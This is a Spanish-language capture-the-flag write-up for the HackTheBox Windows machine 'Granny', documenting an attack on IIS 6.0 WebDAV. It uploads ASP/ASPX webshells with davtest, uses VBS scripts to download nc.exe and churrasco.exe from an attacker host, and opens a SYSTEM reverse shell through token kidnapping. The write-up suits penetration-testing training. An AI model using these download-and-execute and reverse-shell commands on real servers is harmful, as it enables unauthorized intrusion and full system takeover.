---
icon: windows
---

# Granny

## Resumen

### Detalles

| Campo                 | Detalle      |
| --------------------- | ------------ |
| **Nombre**            | Granny       |
| **Sistema Operativo** | Windows      |
| **Plataforma**        | HackTheBox   |
| **Fecha**             | 29/10/2026   |
| **IP Objetivo**       | 10.129.92.31 |

### Executive Summary

Granny es una máquina Windows de dificultad _Easy_ que ejecuta Microsoft IIS 6.0. La superficie de ataque principal es **WebDAV**, mal configurado para permitir la carga de archivos mediante los métodos `PUT` y `MOVE`. Esto permite subir una webshell en ASP para obtener ejecución de comandos como el usuario `NT AUTHORITY\NETWORK SERVICE`. La escalada de privilegios se logra mediante **Token Kidnapping** utilizando la herramienta `churrasco.exe`, que abusa del privilegio `SeImpersonatePrivilege` de las cuentas de servicio para elevar los privilegios a `NT AUTHORITY\SYSTEM`.

### Técnicas

* **Abuso de métodos PUT y MOVE en WebDAV:** Carga y renombrado de archivos maliciosos en el servidor web.
* **Carga de Webshell ASP:** Ejecución remota de comandos a través de un script ASP.
* **Token Kidnapping (Churrasco):** Abuso de `SeImpersonatePrivilege` para robar el token de un proceso con privilegios `SYSTEM`.

## Information Gathering

### Port Scanning

#### TCP

```bash
> nmap -Pn -n -vv -p- 10.129.92.31 -oG allPorts
> nmap -Pn -n -vv -p80 -sCV 10.129.92.31 -oG allServices
```

| Puerto | Servicio | Versión                 | Notas                                       |
| ------ | -------- | ----------------------- | ------------------------------------------- |
| 80/tcp | http     | Microsoft IIS httpd 6.0 | WebDAV habilitado, métodos PUT/MOVE activos |

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

### Enumeration

#### IIS

Se realizó un escaneo de nombres cortos (shortname) y una prueba de conexión WebDAV para verificar los permisos de escritura.

```bash
> iis_shortname_scan.py http://10.129.92.31
```

```
----------------------------------------------------------------
Dir:  /aspnet~1
Dir:  /_vti_s~1
File: /postin~1.htm*
File: /_vti_i~1.htm*
---------------------------------------------------------------
```

El escaneo reveló directorios como `/_vti_bin/` y `_vti_log/`, y el archivo `postinfo.html`, confirmando la presencia de extensiones de FrontPage.

Posteriormente, se utilizó `davtest` para comprobar la capacidad de carga y ejecución de archivos:

```bash
davtest -move -sendbd auto -url http://10.129.92.31
```

Los resultados confirmaron que los métodos `PUT` y `MOVE` estaban permitidos. Se logró subir un archivo `.txt` y renombrarlo a `.asp` y `.aspx`, logrando la ejecución de código en el servidor a través de la webshell `asp_cmd.asp`.

## Explotación

### Foothold

* **Vulnerabilidad:** Configuración insegura de WebDAV que permite la carga y ejecución de scripts del lado del servidor (ASP/ASPX) mediante los métodos `PUT` y `MOVE`
* **Exploit:** `davtest` (herramienta de automatización) y webshell `asp_cmd.asp`
* **Procedimiento:**

1. Se ejecutó `davtest` para automatizar la carga de las webshells.
2. Se accedió a la webshell `asp_cmd.asp` (`http://10.129.92.31/DavTestDir_y2YgpoZ/asp_cmd.asp`). Al ejecutar `whoami`, se observó que corría bajo el usuario `\\GRANNY\IUSR_GRANPA`. Este usuario **no tiene permisos** para leer el archivo `user.txt` en el escritorio de `Lakis`.
3. Para obtener más privilegios, se utilizó la webshell `aspx_cmd.aspx`, que se ejecuta bajo el contexto de `NETWORK SERVICE`.

<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

### Privesc

* **Vulnerabilidad:** `SeImpersonatePrivilege` asignado a la cuenta `NETWORK SERVICE`, que permite la suplantación de tokens.
* **Exploit:** `churrasco.exe` (Token Kidnapping).
* **Procedimiento:**

1. **Preparación:** En la máquina atacante, levantamos un servidor HTTP para alojar `nc.exe` y `churrasco.exe`, y nos pusimos en escucha con Netcat en el puerto 4430.

```bash
rlwrap -cAr nc -lvnp 4430
```

2. **Transferencia de Netcat (vía VBS):** A través de la webshell ASPX (ejecutándose como `NETWORK SERVICE`), creamos un script VBS (`d.vbs`) en `C:\Windows\Temp\` para descargar `nc.exe`.

```powershell
echo Set x = CreateObject("MSXML2.XMLHTTP") > C:\Windows\Temp\d.vbs
echo x.Open "GET", "http://10.10.15.78:9090/nc.exe", False >> C:\Windows\Temp\d.vbs
echo x.Send >> C:\Windows\Temp\d.vbs
echo Set s = CreateObject("ADODB.Stream") >> C:\Windows\Temp\d.vbs
echo s.Type = 1 >> C:\Windows\Temp\d.vbs
echo s.Open >> C:\Windows\Temp\d.vbs
echo s.Write x.ResponseBody >> C:\Windows\Temp\d.vbs
echo s.SaveToFile "C:\Windows\Temp\nc.exe", 2 >> C:\Windows\Temp\d.vbs
echo s.Close >> C:\Windows\Temp\d.vbs
```

```
cscript //nologo C:\Windows\Temp\d.vbs
```

3. **Transferencia de Churrasco (vía VBS):** De la misma forma, creamos un segundo script VBS (`x.vbs`) para descargar `churrasco.exe`.

```powershell
echo Set x = CreateObject("MSXML2.XMLHTTP") > C:\Windows\Temp\x.vbs
echo x.Open "GET", "http://10.10.15.78:9090/churrasco.exe", False >> C:\Windows\Temp\x.vbs
echo x.Send >> C:\Windows\Temp\x.vbs
echo Set s = CreateObject("ADODB.Stream") >> C:\Windows\Temp\x.vbs
echo s.Type = 1 >> C:\Windows\Temp\x.vbs
echo s.Open >> C:\Windows\Temp\x.vbs
echo s.Write x.ResponseBody >> C:\Windows\Temp\x.vbs
echo s.SaveToFile "C:\Windows\Temp\churrasco.exe", 2 >> C:\Windows\Temp\x.vbs
echo s.Close >> C:\Windows\Temp\x.vbs
```

```
cscript //nologo C:\Windows\Temp\x.vbs
```

4. **Ejecución y Elevación:** Utilizamos `churrasco.exe` con el parámetro `-d` para ejecutar `nc.exe` y enviarnos una shell inversa. Churrasco abusará del token de `NETWORK SERVICE` para lanzar el comando como `SYSTEM`.

```powershell
C:\WINDOWS\Temp\churrasco.exe -d "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.78 4430"
```

5. **Conexión:** Recibimos la conexión en nuestro listener. Al ejecutar `whoami`, confirmamos que somos `nt authority\system`. Con esta shell, finalmente pudimos leer `user.txt` y `root.txt`.

* **Evidencia:** (`user.txt`)&#x20;

<figure><img src="../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

* **Evidencia:** (`root.txt`)&#x20;

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

